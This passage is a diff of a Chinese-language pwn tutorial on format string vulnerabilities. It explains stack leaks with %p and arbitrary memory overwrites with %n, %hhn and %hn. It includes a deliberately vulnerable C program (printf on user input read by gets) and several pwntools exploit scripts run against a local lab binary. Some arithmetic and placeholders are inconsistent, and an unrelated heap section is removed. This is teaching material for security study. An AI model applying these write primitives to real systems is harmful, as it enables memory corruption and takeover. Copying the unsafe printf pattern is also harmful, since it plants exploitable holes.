+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/pwn-3/13.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/13_hu_33dc14dafbc1cad.png 480w, /p/pwn-3/13_hu_28791b40fafafb5a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>我们只需要把前面的AAAA去掉就是纯净的所需地址了。</p>
+<h4 id="程序交互演示">程序交互演示
+</h4><p>以32位程序作为例子： <a class="link" href="fmt_32" >fmt_32</a></p>
+<p>这次我们不用gdb调试了，本地运行这个程序文件，进一步查看在程序交互上利用printf来泄露的原理：</p>
+<p>输入：<strong>AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</strong>（64位就改成AAAAAAAA，其实什么字母都可以，只是方便做标记而已😄，字母A的ASCII是0x41）</p>
+<p><img src="/p/pwn-3/14.png"
+	width="1829"
+	height="174"
+	srcset="/p/pwn-3/14_hu_a32b8fc21909411.png 480w, /p/pwn-3/14_hu_8cb51cae5b4a3719.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1051"
+		data-flex-basis="2522px"
+	
+>从输出结果来看，<code>0x41414141</code>（即我输入的 <code>AAAA</code>）出现在第 7 个 <code>%p</code> 的位置，这和之前使用 <code>%7$s</code> 的逻辑 <strong>完全一致</strong>，本质上是同一个偏移计算规则。（这一点学过C语言的printf函数用法都有所感悟吧）</p>
+<p>其实这种方法很快，比用gdb快多了，但重在盲注，你不知道要几个<code>%p</code>，gdb的底层原理展现的比较清晰，希望你能理解背后的原理。</p>
+<blockquote class="alert alert-tip">
+    <blockquote>
+<p>综上所述：<code>0x41414141</code> 出现在第 7 个 <code>%p</code> 的位置，是因为在你的 32 位程序中，输入的 <code>AAAA</code> 被压入栈后，恰好位于格式化字符串参数列表的第 7 个位置，这是由 32 位程序的栈布局和参数解析规则共同决定的。这个偏移（7）是固定的，因此之前用 <code>%7$s</code> 时，只要在该位置放入有效地址（如 <code>gets@got</code>），就能正确读取目标内容。</p>
+<p>格式化字符串漏洞：计算处格式化字符串的偏移—▸泄露所需函数got的地址—▸后续手法&hellip;</p>
+</blockquote></blockquote>
+<h2 id="数字覆盖">数字覆盖
+</h2><p>格式化字符串函数介绍：</p>
+<p><code>%n</code>，不输出字符，但是会把已经成功输出的字符个数写入对应的整型指针参数所指的变量。（如果前面输出了3个字符，那么就会改变对应指针的对应地址的值改成3）</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>0x8</th>
+          <th>0x28</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0x10</td>
+          <td>0xFFFF1234</td>
+      </tr>
+      <tr>
+          <td>0x18</td>
+          <td>0xFFFF1234</td>
+      </tr>
+      <tr>
+          <td>0x20</td>
+          <td>0xFFFF1234</td>
+      </tr>
+      <tr>
+          <td>0x28</td>
+          <td>p32(0x80102048)</td>
+      </tr>
+      <tr>
+          <td>0x30</td>
+          <td>%xc%4$n</td>
+      </tr>
+      <tr>
+          <td>0x38</td>
+          <td>%p%p%p%p</td>
+      </tr>
+      <tr>
+          <td>0x40</td>
+          <td>%p%p%p%p</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>执行了<code>%xc%4$n</code>后，往0x28修改成0xX（由hello—&gt;0xX）：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th style="text-align: left">0x80102048</th>
+          <th>0xX</th>
+      </tr>
+  </thead>
+  <tbody>
+  </tbody>
+</table></div>
+<h3 id="任意地址内存覆盖">任意地址内存覆盖
+</h3><p>首先，我们需要想办法知道要修改的变量的地址。</p>
+<p>一般我们可以直接通过IDA查看，其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数（），按照上一章所讲的使用gdb进行调试获取即可。</p>
+<p>来个实例看看：</p>
+<p>C源代码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1140,139 +1724,835 @@ ROP、shellcode、栈转移等。</p>
 </span><span class="lnt">17
 </span><span class="lnt">18
 </span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+-------------------+      +-------------------+      +-------------------+
-</span></span><span class="line"><span class="cl">|     smallbin      | &lt;--&gt; |   free chunk 1    | &lt;--&gt; |   free chunk 2    | &lt;--&gt; ...
-</span></span><span class="line"><span class="cl">|  (size = 0x20)    |      |                   |      |                   |
-</span></span><span class="line"><span class="cl">+-------------------+      +-------------------+      +-------------------+
-</span></span><span class="line"><span class="cl">         |
-</span></span><span class="line"><span class="cl">         v
-</span></span><span class="line"><span class="cl">+-------------------+      +-------------------+      +-------------------+
-</span></span><span class="line"><span class="cl">|     smallbin      | &lt;--&gt; |   free chunk 1    | &lt;--&gt; |   free chunk 2    | &lt;--&gt; ...
-</span></span><span class="line"><span class="cl">|  (size = 0x30)    |      |                   |      |                   |
-</span></span><span class="line"><span class="cl">+-------------------+      +-------------------+      +-------------------+
-</span></span><span class="line"><span class="cl">         |
-</span></span><span class="line"><span class="cl">         v
-</span></span><span class="line"><span class="cl">       ... (更多 smallbin，大小递增)
-</span></span><span class="line"><span class="cl">         |
-</span></span><span class="line"><span class="cl">         v
-</span></span><span class="line"><span class="cl">+-------------------+      +-------------------+      +-------------------+
-</span></span><span class="line"><span class="cl">|     smallbin      | &lt;--&gt; |   free chunk 1    | &lt;--&gt; |   free chunk 2    | &lt;--&gt; ...
-</span></span><span class="line"><span class="cl">|  (size = 0x3F0)   |      |                   |      |                   |
-</span></span><span class="line"><span class="cl">+-------------------+      +-------------------+      +-------------------+
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;2</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>        
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;0xdeadbeef</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;0x30</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h4 id="largebin">Largebin
-</h4><p>管理large chunk，63个双向链表，FIFO。同一个双线链表中chunk大小可以不一样，但是在一定范围内，bins大小从小到大排列。</p>
-<blockquote>
-<p>在此我们先不学习larbin attack的相关内容，所以看看就行，了解一下。比较少遇见Largebin的相关题。</p>
+</div><p>编译32位：  <a class="link" href="test" >test</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc demox.c -o <span class="nb">test</span> -m32 -no-pie
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在IDA看到这个程序是有格式化字符串漏洞的，首先就是需要确定好格式化字符串的偏移，方法有几种，之前讲过，这里都复现一下。</p>
+<p>第一种：</p>
+<p><img src="/p/pwn-3/15.png"
+	width="1698"
+	height="95"
+	srcset="/p/pwn-3/15_hu_165fd3376c1ec2ad.png 480w, /p/pwn-3/15_hu_427263b216e3bf03.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1787"
+		data-flex-basis="4289px"
+	
+></p>
+<p>可以得知格式化字符串的偏移是7</p>
+<p>第二种：</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行后就是这样如下情况：</p>
+<p><img src="/p/pwn-3/16.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/16_hu_5cde66cf95aff15c.png 480w, /p/pwn-3/16_hu_124b067b1c7e8092.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>得到偏移后，进行下一步，先改exp：</p>
+<p><img src="/p/pwn-3/17.png"
+	width="1020"
+	height="90"
+	srcset="/p/pwn-3/17_hu_fc9307ce88163d13.png 480w, /p/pwn-3/17_hu_5697558cc2a74d3d.png 1024w"
+	loading="lazy"
+	
+		alt="变量a的地址:0x804C020"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1133"
+		data-flex-basis="2720px"
+	
+></p>
+<p>python2：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;%</span><span class="si">{}</span><span class="s2">c%7$n&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>（建议用）python3：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="s2">&#34;%</span><span class="si">{}</span><span class="s2">c%7$n&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mh">0x30</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 或者直接写死数值：payload = p32(a_address) + b&#34;%44c%7$n&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>python2为例子，运行结果如下：</p>
+<p><img src="/p/pwn-3/18.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/18_hu_5174979d7c44ef50.png 480w, /p/pwn-3/18_hu_7549fcfecf9d544a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>然后就运行telescope命令，附带esp寄存器的地址，左边的是输出结果了，注意esp地址是红色框的那个，别看错咯。</p>
+<p>来我们再用fmtarg验证看看（其实往下看就能看到偏移了，用fmtarg查看就是更准确而已，用手指数的过来也行）：</p>
+<p><img src="/p/pwn-3/19.png"
+	width="1835"
+	height="430"
+	srcset="/p/pwn-3/19_hu_772ce0962d321394.png 480w, /p/pwn-3/19_hu_63fd4631850be71.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="426"
+		data-flex-basis="1024px"
+	
+></p>
+<p>The index of format argument : <code>7 (&quot;\%6$p&quot;)</code></p>
+<p>继续&hellip;</p>
+<p><img src="/p/pwn-3/20.png"
+	width="1918"
+	height="438"
+	srcset="/p/pwn-3/20_hu_3690c27c4ef57c71.png 480w, /p/pwn-3/20_hu_bc7825d912793d0d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="437"
+		data-flex-basis="1050px"
+	
+></p>
+<p>紫色这部分是a的地址，我们可以看到0x30了。</p>
+<p>也就是说运行了这exp，我们成功实现了<strong>任意地址覆盖</strong>，我现在停止调试退出界面，去看查看debug记录就发现给我输出了0x30：</p>
+<p><img src="/p/pwn-3/21.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/21_hu_a04afd81e96c0870.png 480w, /p/pwn-3/21_hu_ac543c29b95d963d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>也就是说a已经覆盖成0x30了，促使条件if达成，触发<code>printf(&quot;0x30\n&quot;);</code></p>
+<p>hhh&hellip;怎么样是不是很清晰的逻辑？还是说难爆了！！没事慢慢来。</p>
+<h3 id="覆盖小数字">覆盖小数字
+</h3><p>来考虑下如何修改.data段的变量为一个较小的数字，比如说，小于<code>机器字长</code>的数字（以2为例）。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地
+址放在最前面，那么将直接占用机器字长个（4或8）字节。显然，无论之后如何输出，都只会比4大。</p>
+<p>一般有两种利用方法：</p>
+<ol>
+<li>利用整型溢出</li>
+<li>将偏移置后</li>
+</ol>
+<p>我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把tag放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。比如<code>aa%k$naddr</code></p>
+<p>exp:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;aa%9$nbb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/pwn-3/22.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/22_hu_14c5e05df500549.png 480w, /p/pwn-3/22_hu_af193aa0287aa3c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>用telescope命令查看特定地址，然后用ni使payload注入，下一步再用telescope命令查看a变量的变化，可以看到a变成2了。</p>
+<p><img src="/p/pwn-3/23.png"
+	width="1164"
+	height="349"
+	srcset="/p/pwn-3/23_hu_8d55ee4f4ffe0bfb.png 480w, /p/pwn-3/23_hu_51d5f8aaea6fc7a0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="333"
+		data-flex-basis="800px"
+	
+></p>
+<p>可以看到输出了2，成功实现覆盖了。</p>
+<h3 id="覆盖大数字">覆盖大数字
+</h3><p>上面介绍了覆盖小数字，这里我们就来介绍覆盖大数字了。上面也说了，可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。因此我们一般选用另一种方法来覆盖大数字。</p>
+<p>首先我们要先了解变量在内存中的存储格式：
+在×86和×64的体系结构中，变量的存储格式为以<strong>小端存储</strong>，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为\×78\x56\x34\×12。</p>
+<ul>
+<li>
+<p>hh对于整数类型，printf期待一个从char提升的int尺寸的整型参数。</p>
+</li>
+<li>
+<p>h对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</p>
+</li>
+</ul>
+<p>所以我们可以利用<code>%hhn</code>与<code>%hn</code>向单(双)字节写入数据。</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>0x8</th>
+          <th>0x28</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0x10</td>
+          <td>0xFFFF1234</td>
+      </tr>
+      <tr>
+          <td>0x18</td>
+          <td>0xFFFF1234</td>
+      </tr>
+      <tr>
+          <td>0x20</td>
+          <td>0xFFFF1234</td>
+      </tr>
+      <tr>
+          <td>0x28</td>
+          <td>p32(0x80102048+6)</td>
+      </tr>
+      <tr>
+          <td>0x30</td>
+          <td>p32(0x80102048+4)</td>
+      </tr>
+      <tr>
+          <td>0x38</td>
+          <td>p32(0x80102048+2)</td>
+      </tr>
+      <tr>
+          <td>0x40</td>
+          <td>p32(0x80102048)</td>
+      </tr>
+      <tr>
+          <td>0x48</td>
+          <td>%xxxc%3$hhn</td>
+      </tr>
+  </tbody>
+</table></div>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>0x80102048</th>
+          <th>0xXXXXXXX</th>
+      </tr>
+  </thead>
+  <tbody>
+  </tbody>
+</table></div>
+<p>exp1：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#0xdeadbeef</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#de -&gt; 3</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#ad -&gt; 2</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#be -&gt; 1</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#ef -&gt; 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="si">%x</span><span class="s2">xc%7$hhn&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>payload+= (&quot;%xxc%7$hhn&quot;).encode()</code>的xx是多少？</p>
+<p>输出的总字符数包含两部分：</p>
+<ol>
+<li>前 4 个地址的长度：每个地址是 4 字节（32 位），共 <code>4×4 = 16</code> 字节。</li>
+<li><code>%xxc</code> 输出的字符数：<code>xx</code> 个字符（<code>%xxc</code> 会打印 <code>xx</code> 个 <code>'c'</code> 字符）。</li>
+</ol>
+<p>因此，总字符数 = 16（地址部分） + xx（<code>%xxc</code> 输出的 &lsquo;c&rsquo;） = 目标值（190）。</p>
+<p>0xad是173，那么0xad-16=157；0xbe-0xad=17;0xde-0xbe=32;0xef-0xde=17</p>
+<p>exp2：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
